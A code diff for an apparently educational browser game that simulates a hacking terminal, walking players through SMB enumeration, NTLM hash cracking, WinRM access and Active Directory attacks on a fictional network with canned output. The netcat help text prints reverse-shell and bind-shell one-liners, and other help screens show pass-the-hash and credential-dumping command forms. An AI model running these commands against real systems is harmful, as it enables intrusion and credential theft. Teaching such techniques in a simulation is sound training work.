+    print('╔══════════╣ Checking sudo permissions', 'warning');
+    if (state.shellUser === 'joshua') {
+      print('    User joshua may run:', 'system');
+      print('    (root) /opt/mysql-backup.sh', 'success');
+    } else {
+      print('    User svc may not run sudo on codify.', 'system');
+    }
+    print('', '');
+    print('═══════════════════════════════════╣ Interesting Files ╠═══════════════════════════════════', 'info');
+    print('╔══════════╣ Scripts in /opt', 'warning');
+    print('    -rwxr-xr-x 1 root root 928 Sep 12 17:40 /opt/mysql-backup.sh', 'success');
+    print('', '');
+    print('[!] Found potential privesc vector: /opt/mysql-backup.sh', 'warning');
+    print('[*] Analyze with: cat /opt/mysql-backup.sh', 'info');
+    print('', '');
+    return;
+  }
+
+  // === NC (netcat) ===
+  if (cmd === 'nc' || cmd === 'netcat' || cmd === 'ncat') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('nc (netcat) - TCP/IP swiss army knife', 'info');
+      print('', '');
+      print('Usage: nc [options] [hostname] [port]', 'system');
+      print('', '');
+      print('OPTIONS:', 'warning');
+      print('  -l              Listen mode, for inbound connects', 'success');
+      print('  -v              Verbose', 'system');
+      print('  -n              Numeric-only IP addresses, no DNS', 'system');
+      print('  -p <port>       Local port number', 'system');
+      print('  -e <prog>       Execute program after connect (dangerous!)', 'system');
+      print('  -c <shell>      Shell commands to exec', 'system');
+      print('  -u              UDP mode', 'system');
+      print('  -w <secs>       Timeout for connects and final net reads', 'system');
+      print('  -z              Zero-I/O mode [used for scanning]', 'system');
+      print('', '');
+      print('COMMON USAGE:', 'warning');
+      print('  Listener (attacker):         nc -lvnp 4444', 'success');
+      print('  Reverse shell (target):      nc <attacker_ip> 4444 -e /bin/bash', 'system');
+      print('  Bind shell (target):         nc -lvnp 4444 -e /bin/bash', 'system');
+      print('  File transfer (receive):     nc -lvnp 4444 > file', 'system');
+      print('  File transfer (send):        nc <ip> 4444 < file', 'system');
+      print('  Port scan:                   nc -zv <ip> 1-1000', 'system');
+      print('', '');
+      return;
+    }
+
+    // Validate listener flags
+    const hasListen = args.includes('-l') || args.includes('-lvnp') || args.includes('-nlvp') || args.includes('-lnvp');
+
+    if (!hasListen && !args.some(a => a.match(/^\d+\.\d+\.\d+\.\d+$/))) {
+      print('nc: missing required flags or destination', 'error');
+      print('', '');
+      print('For listener: nc -lvnp <port>', 'system');
+      print('For connect:  nc <host> <port>', 'system');
+      print('', '');
+      print('Try: nc --help for full options', 'system');
+      return;
+    }
+
+    if (hasListen) {
+      // Find port number
+      let port = null;
+      for (let i = 0; i < args.length; i++) {
+        if (args[i] === '-p' && args[i+1]) {
+          port = args[i+1];
+          break;
+        }
+        if (args[i].match(/^\d+$/) && parseInt(args[i]) > 0 && parseInt(args[i]) < 65536) {
+          port = args[i];
+          break;
+        }
+        if (args[i] === '-lvnp' || args[i] === '-nlvp' || args[i] === '-lnvp') {
+          if (args[i+1] && args[i+1].match(/^\d+$/)) {
+            port = args[i+1];
+            break;
+          }
+        }
+      }
+
+      if (!port) {
+        print('nc: missing port number', 'error');
+        print('Usage: nc -lvnp <port>', 'system');
+        return;
+      }
+
+      print(`Listening on 0.0.0.0 ${port}`, 'info');
+      print('[*] Waiting for incoming connection...', 'system');
+      print('[*] Use payload command to trigger reverse shell', 'muted');
       return;
     }
 
@@ -1178,29 +4402,13 @@ async function handleLevel1Command(cmd, args) {
     return;
   }
 
-  if (cmd === 'id' && state.connected) {
-    print('uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)', 'system');
-    return;
+  // === Unknown command ===
+  if (state.gotShell) {
+    print(cmd + ': command not found', 'error');
+  } else {
+    print('Command not found: ' + cmd, 'error');
+    print('Type "help" for available commands', 'system');
   }
-
-  if (cmd === 'ls' && state.connected) {
-    print('Desktop  Documents  user.txt', 'system');
-    return;
-  }
-
-  if (cmd === 'cat' && state.connected) {
-    if (args[0] === 'user.txt') {
-      print('FLAG{n00b_h4ck3r_g0t_sh3ll}', 'success');
-      print('');
-      state.gotShell = true;
-      completeLevel();
-      return;
-    }
-    print('cat: ' + (args[0] || '') + ': No such file', 'error');
-    return;
-  }
-
-  print('Command not found: ' + cmd, 'error');
 }
 
 // ============================================
@@ -1240,13 +4448,76 @@ async function handleLevel2Command(cmd, args) {
   const state = gameState.levelState;
 
   if (cmd === 'help') {
-    print('Available commands:', 'info');
-    print('  nmap <target>           - Network scan', 'system');
-    print('  crackmapexec smb <target> - SMB enumeration', 'system');
-    print('  smbclient //<target>/<share> - Access SMB share', 'system');
-    print('  hashcat -m 1000 <hash>  - Crack NTLM hash', 'system');
-    print('  evil-winrm -i <target> -u <user> -p <pass>', 'system');
-    print('  exit                    - Return to menu', 'system');
+    print('', '');
+    print('╔════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                    LEVEL 2 COMMANDS                            ║', 'info');
+    print('╠════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                               ║', 'info');
+    print('║    nmap <network>         Scan network for hosts              ║', 'system');
+    print('║    crackmapexec smb <ip>  Enumerate SMB shares on target      ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  SMB ACCESS:                                                   ║', 'info');
+    print('║    smbclient //<ip>/<share>   Connect to SMB share           ║', 'system');
+    print('║    get <filename>         Download file from SMB share        ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  CREDENTIAL CRACKING:                                          ║', 'info');
+    print('║    hashcat -m 1000 <hash>  Crack NTLM hash (mode 1000)        ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  LATERAL MOVEMENT:                                             ║', 'info');
+    print('║    evil-winrm -i <ip> -u <user> -p <pass>  WinRM shell        ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  POST-EXPLOITATION:                                            ║', 'info');
+    print('║    whoami                 Show current user (confirms access) ║', 'system');
+    print('║    ls / cat <file>        Browse filesystem                   ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  UTILITY:                                                      ║', 'info');
+    print('║    status                 Show current progress               ║', 'success');
+    print('║    hint                   Get a hint if stuck                 ║', 'warning');
+    print('║    exit                   Return to main menu                 ║', 'system');
+    print('╚════════════════════════════════════════════════════════════════╝', 'info');
+    print('', '');
+    print('TIP: Use TAB for autocomplete, ↑/↓ for command history', 'system');
+    return;
+  }
+
+  if (cmd === 'status') {
+    print('', '');
+    print('┌─────────────────────────────────────┐', 'info');
+    print('│      LEVEL 2 PROGRESS STATUS        │', 'info');
+    print('├─────────────────────────────────────┤', 'info');
+    print(`│  [${state.scanned ? '✓' : ' '}] Network scanned              │`, state.scanned ? 'success' : 'system');
+    print(`│  [${state.foundShares ? '✓' : ' '}] SMB shares discovered        │`, state.foundShares ? 'success' : 'system');
+    print(`│  [${state.gotHash ? '✓' : ' '}] Password hash obtained        │`, state.gotHash ? 'success' : 'system');
+    print(`│  [${state.crackedHash ? '✓' : ' '}] Hash cracked                  │`, state.crackedHash ? 'success' : 'system');
+    print(`│  [${state.authenticated ? '✓' : ' '}] Domain user compromised      │`, state.authenticated ? 'success' : 'system');
+    print('└─────────────────────────────────────┘', 'info');
+    print('', '');
+    return;
+  }
+
+  if (cmd === 'hint') {
+    print('', '');
+    print('💡 HINT:', 'warning');
+    if (!state.scanned) {
+      print('Start by scanning the network to discover hosts.', 'info');
+      print('Try: nmap 10.10.10.0/24', 'success');
+    } else if (!state.foundShares) {
+      print('Check for SMB shares on the file server (10.10.10.50).', 'info');
+      print('Try: crackmapexec smb 10.10.10.50', 'success');
+    } else if (!state.gotHash) {
+      print('Access the IT_Backup share - IT admins often leave sensitive files there.', 'info');
+      print('Try: smbclient //10.10.10.50/IT_Backup', 'success');
+    } else if (!state.crackedHash) {
+      print('You have an NTLM hash! Crack it with hashcat mode 1000.', 'info');
+      print('Try: hashcat -m 1000 hash.txt', 'success');
+    } else if (!state.authenticated) {
+      print('Use the cracked credentials to get a shell on the domain controller.', 'info');
+      print('Try: evil-winrm -i 10.10.10.100 -u svc_backup -p Backup2023!', 'success');
+    } else {
+      print('Verify your access with whoami to complete the level!', 'info');
+      print('Try: whoami', 'success');
+    }
+    print('', '');
     return;
   }
 
@@ -1262,113 +4533,460 @@ async function handleLevel2Command(cmd, args) {
   }
 
   if (cmd === 'nmap') {
-    await simulateLoading('Scanning network 10.10.10.0/24', 3000);
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('Nmap 7.94 ( https://nmap.org )', 'info');
+      print('Usage: nmap [Scan Type(s)] [Options] {target specification}', 'system');
+      print('', '');
+      print('TARGET SPECIFICATION:', 'info');
+      print('  Can pass hostnames, IP addresses, networks (CIDR), etc.', 'system');
+      print('  Ex: 10.10.10.0/24, scanme.nmap.org, 192.168.0.1', 'system');
+      print('', '');
+      print('SCAN TECHNIQUES:', 'info');
+      print('  -sS: TCP SYN scan (stealth)', 'system');
+      print('  -sT: TCP Connect scan', 'system');
+      print('  -sU: UDP scan', 'system');
+      print('  -sn: Ping scan (host discovery only)', 'system');
+      print('', '');
+      print('SERVICE/VERSION DETECTION:', 'info');
+      print('  -sV: Probe ports for service/version info', 'success');
+      print('  -sC: Equivalent to --script=default', 'success');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  nmap 10.10.10.0/24           # Discover hosts on network', 'system');
+      print('  nmap -sV -sC 10.10.10.50     # Service scan specific host', 'system');
+      print('', '');
+      return;
+    }
+
+    // Must provide target
+    if (!args[0]) {
+      print('Nmap: No target specified.', 'error');
+      print('Usage: nmap [options] <target>', 'system');
+      print('Example: nmap 10.10.10.0/24', 'info');
+      return;
+    }
+
+    // Check for network or specific hosts
+    const target = args.find(a => a.match(/^[\d.\/]+$/) || a.includes('10.10.10'));
+    if (!target || (!target.includes('10.10.10') && !target.includes('/24'))) {
+      print(`Starting Nmap 7.94...`, 'system');
+      await simulateLoading('Scanning ' + (target || 'target'), 1500);
+      print('Note: Host seems down.', 'warning');
+      return;
+    }
+
+    await simulateLoading('Scanning network ' + target, 3000);
+    print('');
+    print(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleString()}`, 'system');
+    print('Nmap scan report for ' + target, 'info');
     print('');
     print('Discovered hosts:', 'info');
     print('  10.10.10.1   - Router', 'system');
     print('  10.10.10.10  - WORKSTATION-01 (Windows 10)', 'system');
-    print('  10.10.10.50  - FILE-SRV01 (Windows Server 2019)', 'success');
-    print('  10.10.10.100 - CORP-DC01 (Domain Controller)', 'warning');
+    print('  10.10.10.50  - FILE-SRV01 (Windows Server 2019) [445/tcp open]', 'success');
+    print('  10.10.10.100 - CORP-DC01 (Domain Controller) [88,389,445/tcp open]', 'warning');
     print('');
+    print('Nmap done: 256 IP addresses (4 hosts up) scanned', 'muted');
+    print('');
+    print('[*] SMB (445) open on FILE-SRV01 - enumerate shares!', 'info');
     state.scanned = true;
+    autosave();
     return;
   }
 
-  if (cmd === 'crackmapexec') {
+  if (cmd === 'crackmapexec' || cmd === 'cme' || cmd === 'netexec' || cmd === 'nxc') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('CrackMapExec v5.4.0 (NetExec successor)', 'info');
+      print('', '');
+      print('Usage: crackmapexec <protocol> <target> [options]', 'system');
+      print('', '');
+      print('PROTOCOLS:', 'warning');
+      print('  smb       SMB protocol', 'success');
+      print('  ldap      LDAP protocol', 'system');
+      print('  winrm     WinRM protocol', 'system');
+      print('  mssql     MSSQL protocol', 'system');
+      print('  ssh       SSH protocol', 'system');
+      print('', '');
+      print('SMB OPTIONS:', 'info');
+      print('  --shares              Enumerate shares', 'success');
+      print('  --users               Enumerate domain users', 'system');
+      print('  --groups              Enumerate domain groups', 'system');
+      print('  --pass-pol            Enumerate password policy', 'system');
+      print('  -u USER -p PASS       Authenticate with credentials', 'system');
+      print('  -H HASH               Pass-the-hash (NTLM)', 'system');
+      print('  --local-auth          Local authentication', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  crackmapexec smb 10.10.10.50 --shares', 'system');
+      print('  crackmapexec smb 10.10.10.0/24 -u user -p pass', 'system');
+      print('  crackmapexec smb 10.10.10.50 -u user -H <ntlm_hash>', 'system');
+      print('', '');
+      return;
+    }
+
     if (!state.scanned) {
-      print('Scan the network first', 'warning');
+      print('Scan the network first to discover hosts', 'warning');
+      return;
+    }
+
+    // Must specify protocol
+    if (!args[0] || !['smb', 'ldap', 'winrm', 'mssql', 'ssh'].includes(args[0])) {
+      print('Error: No protocol specified', 'error');
+      print('', '');
+      print('Usage: crackmapexec <protocol> <target> [options]', 'system');
+      print('Protocols: smb, ldap, winrm, mssql, ssh', 'system');
+      print('', '');
+      print('Example: crackmapexec smb 10.10.10.50 --shares', 'info');
+      return;
+    }
+
+    // Must specify target
+    if (!args[1]) {
+      print('Error: No target specified', 'error');
+      print('Usage: crackmapexec smb <target> [options]', 'system');
       return;
     }
 
     if (args.includes('10.10.10.50') || args.includes('FILE-SRV01')) {
-      await simulateLoading('Enumerating SMB shares', 2000);
+      await simulateLoading('Enumerating SMB', 2000);
       print('');
-      print('SMB   10.10.10.50  445  FILE-SRV01  [*] Windows Server 2019', 'system');
-      print('SMB   10.10.10.50  445  FILE-SRV01  [+] Shares:', 'success');
-      print('      IT_Backup    READ', 'success');
-      print('      Users        READ', 'system');
-      print('      ADMIN$       NO ACCESS', 'error');
+      print('SMB         10.10.10.50     445    FILE-SRV01       [*] Windows Server 2019 Build 17763 x64', 'system');
+      print('SMB         10.10.10.50     445    FILE-SRV01       [+] CORP\\ - Guest session', 'info');
+      print('SMB         10.10.10.50     445    FILE-SRV01       [+] Enumerated shares:', 'success');
+      print('SMB         10.10.10.50     445    FILE-SRV01       Share           Permissions     Remark', 'system');
+      print('SMB         10.10.10.50     445    FILE-SRV01       -----           -----------     ------', 'muted');
+      print('SMB         10.10.10.50     445    FILE-SRV01       IT_Backup       READ            ', 'success');
+      print('SMB         10.10.10.50     445    FILE-SRV01       Users           READ            ', 'system');
+      print('SMB         10.10.10.50     445    FILE-SRV01       ADMIN$                          Remote Admin', 'error');
+      print('SMB         10.10.10.50     445    FILE-SRV01       C$                              Default share', 'error');
+      print('SMB         10.10.10.50     445    FILE-SRV01       IPC$            READ            Remote IPC', 'system');
       print('');
+      print('[!] IT_Backup share is readable - connect with smbclient!', 'warning');
       state.foundShares = true;
+      autosave();
       return;
     }
 
-    print('Access denied or host unreachable', 'error');
+    if (args.includes('10.10.10.100') || args.includes('CORP-DC01')) {
+      await simulateLoading('Connecting to DC', 1500);
+      print('');
+      print('SMB         10.10.10.100    445    CORP-DC01        [*] Windows Server 2019 Build 17763 x64', 'system');
+      print('SMB         10.10.10.100    445    CORP-DC01        [-] CORP\\ - Access Denied', 'error');
+      print('');
+      print('[!] Access denied - need valid credentials', 'warning');
+      return;
+    }
+
+    print('Connection failed: Host unreachable or access denied', 'error');
     return;
   }
 
   if (cmd === 'smbclient') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('smbclient - ftp-like client to access SMB/CIFS shares', 'info');
+      print('', '');
+      print('Usage: smbclient //server/share [options]', 'system');
+      print('', '');
+      print('OPTIONS:', 'warning');
+      print('  -U, --user=USERNAME   Set the network username', 'system');
+      print('  -W, --workgroup=WG    Set the workgroup/domain name', 'system');
+      print('  -N, --no-pass         Null authentication (no password)', 'system');
+      print('  -L, --list=HOST       List shares on host', 'system');
+      print('  -c, --command=CMD     Execute command(s)', 'system');
+      print('', '');
+      print('SMB COMMANDS (once connected):', 'info');
+      print('  ls                    List files', 'system');
+      print('  get <file>            Download file', 'success');
+      print('  put <file>            Upload file', 'system');
+      print('  cd <dir>              Change directory', 'system');
+      print('  pwd                   Print current directory', 'system');
+      print('  exit / quit           Exit smbclient', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  smbclient //10.10.10.50/IT_Backup -N', 'system');
+      print('  smbclient //10.10.10.50/share -U "DOMAIN\\user"', 'system');
+      print('  smbclient -L 10.10.10.50 -N', 'system');
+      print('', '');
+      return;
+    }
+
     if (!state.foundShares) {
-      print('Find the shares first', 'warning');
+      print('Error: Find shares first with crackmapexec', 'warning');
+      print('Try: crackmapexec smb 10.10.10.50 --shares', 'info');
       return;
     }
 
-    if (args[0] && args[0].includes('IT_Backup')) {
-      print('smb: \\>', 'system');
-      print('  .                  D        0  Mon Jan 15 09:00:00 2024', 'system');
-      print('  ..                 D        0  Mon Jan 15 09:00:00 2024', 'system');
-      print('  old_passwords.txt  A      156  Mon Jan 15 08:45:00 2024', 'success');
-      print('  config.bak         A     1024  Mon Jan 15 08:30:00 2024', 'system');
-      print('');
-      print('Use "get old_passwords.txt" to download', 'info');
+    // Must provide share path
+    if (!args[0]) {
+      print('smbclient: Missing share path', 'error');
+      print('Usage: smbclient //server/share [options]', 'system');
+      print('Example: smbclient //10.10.10.50/IT_Backup -N', 'info');
       return;
     }
 
-    if (args[0] && args[0].includes('get')) {
-      print('getting file old_passwords.txt...', 'system');
-      print('');
-      print('--- old_passwords.txt ---', 'info');
-      print('# Old password hashes - to be deleted', 'warning');
-      print('svc_backup:1001:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::', 'success');
-      print('');
+    // Validate share path format
+    if (!args[0].startsWith('//')) {
+      print('smbclient: Invalid share path format', 'error');
+      print('Share path must start with //server/share', 'system');
+      print('Example: smbclient //10.10.10.50/IT_Backup', 'info');
+      return;
+    }
+
+    if (args[0].includes('IT_Backup')) {
+      print('', '');
+      print('Try "help" to get a list of possible commands.', 'muted');
+      print('smb: \\> ls', 'system');
+      print('  .                                   D        0  Mon Jan 15 09:00:00 2024', 'system');
+      print('  ..                                  D        0  Mon Jan 15 09:00:00 2024', 'system');
+      print('  old_passwords.txt                   A      156  Mon Jan 15 08:45:00 2024', 'success');
+      print('  config.bak                          A     1024  Mon Jan 15 08:30:00 2024', 'system');
+      print('', '');
+      print('                8153023 blocks of size 4096. 3142523 blocks available', 'muted');
+      print('', '');
+      print('[!] Interesting file found: old_passwords.txt', 'warning');
+      print('[*] Use: get old_passwords.txt', 'info');
+      state.inSmbShare = true;
+      return;
+    }
+
+    if (args[0].includes('ADMIN$') || args[0].includes('C$')) {
+      print('session setup failed: NT_STATUS_ACCESS_DENIED', 'error');
+      return;
+    }
+
+    print('tree connect failed: NT_STATUS_BAD_NETWORK_NAME', 'error');
+    return;
+  }
+
+  // Separate get command for SMB download
+  if (cmd === 'get') {
+    if (!state.foundShares) {
+      print('Not connected to any share', 'error');
+      return;
+    }
+
+    if (args[0] === 'old_passwords.txt' || (args[0] && args[0].includes('password'))) {
+      await simulateLoading('Downloading old_passwords.txt', 1500);
+      print('', '');
+      print('╔════════════════════════════════════════════════════════════╗', 'info');
+      print('║             FILE: old_passwords.txt                        ║', 'info');
+      print('╠════════════════════════════════════════════════════════════╣', 'info');
+      print('║  # Old password hashes - to be deleted                     ║', 'warning');
+      print('║  # TODO: Remove this file! - IT Admin                      ║', 'warning');
+      print('║                                                            ║', 'info');
+      print('║  svc_backup:1001:aad3b435b51404eeaad3b435b51404ee:         ║', 'system');
+      print('║    58a478135a93ac3bf058a5ea0e8fdb71:::                     ║', 'success');
+      print('╚════════════════════════════════════════════════════════════╝', 'info');
+      print('', '');
+      print('[!] NTLM hash captured!', 'success');
+      print('[*] Format: username:uid:lm_hash:ntlm_hash', 'system');
+      print('[*] Use hashcat -m 1000 to crack the NTLM hash', 'info');
+      print('', '');
       playAlert();
       state.gotHash = true;
+      autosave();
       return;
     }
 
-    print('Share not found', 'error');
+    print('File not found: ' + (args[0] || 'no filename specified'), 'error');
     return;
   }
 
   if (cmd === 'hashcat') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('hashcat v6.2.6 - advanced password recovery', 'info');
+      print('', '');
+      print('Usage: hashcat [options]... hash|hashfile [dictionary|mask|directory]...', 'system');
+      print('', '');
+      print('OPTIONS:', 'warning');
+      print('  -m, --hash-type <num>       Hash-type (see below)', 'success');
+      print('  -a, --attack-mode <num>     Attack-mode (0=straight, 3=brute)', 'system');
+      print('  -o, --outfile <file>        Output file', 'system');
+      print('  --show                      Show cracked passwords', 'system');
+      print('', '');
+      print('COMMON HASH MODES:', 'warning');
+      print('    0 | MD5', 'system');
+      print('  100 | SHA1', 'system');
+      print(' 1000 | NTLM (Windows)', 'success');
+      print(' 3200 | bcrypt', 'system');
+      print(' 5600 | NetNTLMv2', 'system');
+      print('13100 | Kerberos 5 TGS-REP (Kerberoast)', 'success');
+      print('18200 | Kerberos 5 AS-REP (AS-REP roast)', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  hashcat -m 1000 hash.txt rockyou.txt', 'system');
+      print('  hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a', 'system');
+      print('', '');
+      return;
+    }
+
     if (!state.gotHash) {
       print('Need a hash to crack first', 'warning');
       return;
     }
 
+    // Validate -m flag
+    if (!args.includes('-m')) {
+      print('hashcat: Hash-type required (-m)', 'error');
+      print('Usage: hashcat -m <mode> <hash_file> <wordlist>', 'system');
+      print('', '');
+      print('For NTLM: hashcat -m 1000 hash.txt rockyou.txt', 'info');
+      return;
+    }
+
+    const mIdx = args.indexOf('-m');
+    const mode = args[mIdx + 1];
+
+    if (mode !== '1000') {
+      print(`hashcat: starting hash-mode ${mode}...`, 'system');
+      await simulateLoading('Analyzing hash', 1500);
+      print('Hashfile format: NTLM hash detected', 'info');
+      print(`Hash-mode ${mode} doesn't match the hash type`, 'error');
+      print('', '');
+      print('[!] This is an NTLM hash. Use: hashcat -m 1000', 'warning');
+      return;
+    }
+
+    // Check for wordlist
+    const hasWordlist = args.some(a => a.includes('.txt') || a.includes('rockyou'));
+    if (!hasWordlist) {
+      print('hashcat: No wordlist specified', 'error');
+      print('Usage: hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt', 'system');
+      return;
+    }
+
     await simulateLoading('Cracking NTLM hash', 4000);
-    print('');
+    print('', '');
+    print('hashcat (v6.2.6) starting...', 'info');
+    print('', '');
     print('58a478135a93ac3bf058a5ea0e8fdb71:Backup2023!', 'success');
-    print('');
+    print('', '');
     print('Session..........: hashcat', 'system');
     print('Status...........: Cracked', 'success');
-    print('Hash.Type........: NTLM', 'system');
-    print('');
+    print('Hash.Mode........: 1000 (NTLM)', 'system');
+    print('Hash.Target......: 58a478135a93ac3bf058a5ea0e8fdb71', 'system');
+    print('Recovered........: 1/1 (100.00%) Digests', 'success');
+    print('', '');
+    print('[+] Cracked: svc_backup:Backup2023!', 'success');
+    print('[*] Use these creds with evil-winrm', 'info');
     playSuccess();
     state.crackedHash = true;
+    autosave();
     return;
   }
 
   if (cmd === 'evil-winrm') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('Evil-WinRM v3.5 - Windows Remote Management Shell', 'info');
+      print('', '');
+      print('Usage: evil-winrm -i IP -u USER [-p PASS] [-H HASH] [options]', 'system');
+      print('', '');
+      print('REQUIRED:', 'warning');
+      print('  -i, --ip IP              Remote host IP or hostname', 'success');
+      print('  -u, --user USER          Username', 'success');
+      print('', '');
+      print('AUTHENTICATION:', 'info');
+      print('  -p, --password PASS      Password', 'system');
+      print('  -H, --hash HASH          NTLM hash (Pass-the-Hash)', 'system');
+      print('  -k, --kerberos           Use Kerberos authentication', 'system');
+      print('', '');
+      print('OPTIONS:', 'info');
+      print('  -s, --scripts PATH       Powershell scripts path', 'system');
+      print('  -e, --executables PATH   C# executables path', 'system');
+      print('  -P, --port PORT          Remote WinRM port (default: 5985)', 'system');
+      print('  -S, --ssl                Use SSL (port 5986)', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  evil-winrm -i 10.10.10.100 -u svc_backup -p Backup2023!', 'success');
+      print('  evil-winrm -i 10.10.10.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash', 'system');
+      print('', '');
+      return;
+    }
+
     if (!state.crackedHash) {
-      print('Need valid credentials', 'error');
+      print('Need valid credentials (crack the hash first)', 'error');
       return;
     }
 
-    if (args.includes('svc_backup') && args.includes('Backup2023!')) {
-      await simulateLoading('Connecting to CORP-DC01', 2000);
-      print('');
-      print('Evil-WinRM shell v3.4', 'success');
-      print('Info: Establishing connection to remote endpoint', 'system');
-      print('');
-      print('*Evil-WinRM* PS C:\\Users\\svc_backup\\Desktop>', 'success');
-      print('');
-      prompt.textContent = '*Evil-WinRM* PS>';
-      state.authenticated = true;
+    // Validate required flags
+    if (!args.includes('-i')) {
+      print('Error: Target IP required (-i)', 'error');
+      print('Usage: evil-winrm -i <ip> -u <user> -p <password>', 'system');
       return;
     }
 
-    print('WinRM connection failed', 'error');
+    if (!args.includes('-u')) {
+      print('Error: Username required (-u)', 'error');
+      print('Usage: evil-winrm -i <ip> -u <user> -p <password>', 'system');
+      return;
+    }
+
+    if (!args.includes('-p') && !args.includes('-H')) {
+      print('Error: Password (-p) or hash (-H) required', 'error');
+      print('Usage: evil-winrm -i <ip> -u <user> -p <password>', 'system');
+      return;
+    }
+
+    // Get values
+    const ipIdx = args.indexOf('-i');
+    const ip = args[ipIdx + 1];
+    const userIdx = args.indexOf('-u');
+    const user = args[userIdx + 1];
+
+    let pass = null;
+    if (args.includes('-p')) {
+      const passIdx = args.indexOf('-p');
+      pass = args[passIdx + 1];
+    }
+
+    // Validate credentials
+    if (ip !== '10.10.10.100') {
+      await simulateLoading('Connecting to ' + ip, 1500);
+      print('Error: WinRM service not available on ' + ip, 'error');
+      print('[*] Try the Domain Controller: 10.10.10.100', 'info');
+      return;
+    }
+
+    if (user !== 'svc_backup') {
+      await simulateLoading('Authenticating', 1500);
+      print('Error: Authentication failed - invalid username', 'error');
+      return;
+    }
+
+    if (pass !== 'Backup2023!') {
+      await simulateLoading('Authenticating', 1500);
+      print('Error: Authentication failed - invalid password', 'error');
+      print('[*] Did you crack the hash correctly?', 'info');
+      return;
+    }
+
+    await simulateLoading('Connecting to CORP-DC01', 2000);
+    print('', '');
+    print('Evil-WinRM shell v3.5', 'success');
+    print('', '');
+    print('Warning: Remote path completions is disabled due to ruby/telecom version', 'muted');
+    print('', '');
+    print('Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion', 'muted');
+    print('', '');
+    print('Info: Establishing connection to remote endpoint', 'info');
+    print('', '');
+    print('*Evil-WinRM* PS C:\\Users\\svc_backup\\Desktop> ', 'success');
+    print('', '');
+    print('[+] Connected as CORP\\svc_backup!', 'success');
+    print('[*] Type "whoami" to verify access and complete the level', 'info');
+    prompt.textContent = '*Evil-WinRM* PS>';
+    state.authenticated = true;
+    autosave();
     return;
   }
 
@@ -1434,14 +5052,71 @@ async function handleLevel3Command(cmd, args) {
   const state = gameState.levelState;
 
   if (cmd === 'help') {
-    print('Available commands:', 'info');
-    print('  bloodhound-python -d <domain> -u <user> -p <pass> -c all', 'system');
-    print('  bloodhound             - Analyze collected data', 'system');
-    print('  rubeus kerberoast      - Kerberoast attack', 'system');
-    print('  hashcat -m 13100 <hash> - Crack TGS ticket', 'system');
-    print('  impacket-secretsdump   - Dump credentials', 'system');
-    print('  impacket-psexec        - Get shell as user', 'system');
-    print('  exit                   - Return to menu', 'system');
+    print('', '');
+    print('╔════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                    LEVEL 3 COMMANDS                            ║', 'info');
+    print('╠════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                               ║', 'info');
+    print('║    bloodhound-python -d <domain> -u <user> -p <pass> -c all   ║', 'system');
+    print('║    bloodhound           Analyze collected AD data             ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  KERBEROS ATTACKS:                                             ║', 'info');
+    print('║    rubeus kerberoast    Request TGS for SPNs (offline crack)  ║', 'system');
+    print('║    hashcat -m 13100     Crack Kerberos TGS ticket             ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  CREDENTIAL DUMPING:                                           ║', 'info');
+    print('║    impacket-secretsdump  Dump domain secrets (needs privs)    ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  LATERAL MOVEMENT:                                             ║', 'info');
+    print('║    impacket-psexec      Get shell via SMB (pass-the-hash)     ║', 'system');
+    print('║                                                                ║', 'info');
+    print('║  UTILITY:                                                      ║', 'info');
+    print('║    status               Show current progress                 ║', 'success');
+    print('║    hint                 Get a hint if stuck                   ║', 'warning');
+    print('║    exit                 Return to main menu                   ║', 'system');
+    print('╚════════════════════════════════════════════════════════════════╝', 'info');
+    print('', '');
+    print('TIP: Use TAB for autocomplete, ↑/↓ for command history', 'system');
+    return;
+  }
+
+  if (cmd === 'status') {
+    print('', '');
+    print('┌─────────────────────────────────────┐', 'info');
+    print('│      LEVEL 3 PROGRESS STATUS        │', 'info');
+    print('├─────────────────────────────────────┤', 'info');
+    print(`│  [${state.collectedBloodhound ? '✓' : ' '}] AD data collected            │`, state.collectedBloodhound ? 'success' : 'system');
+    print(`│  [${state.foundPath ? '✓' : ' '}] Attack path identified        │`, state.foundPath ? 'success' : 'system');
+    print(`│  [${state.kerberoasted ? '✓' : ' '}] Kerberoast completed          │`, state.kerberoasted ? 'success' : 'system');
+    print(`│  [${state.crackedTicket ? '✓' : ' '}] TGS ticket cracked            │`, state.crackedTicket ? 'success' : 'system');
+    print(`│  [${state.gotDA ? '✓' : ' '}] Domain Admin achieved         │`, state.gotDA ? 'success' : 'system');
+    print('└─────────────────────────────────────┘', 'info');
+    print('', '');
+    return;
+  }
+
+  if (cmd === 'hint') {
+    print('', '');
+    print('💡 HINT:', 'warning');
+    if (!state.collectedBloodhound) {
+      print('Start by collecting Active Directory data for analysis.', 'info');
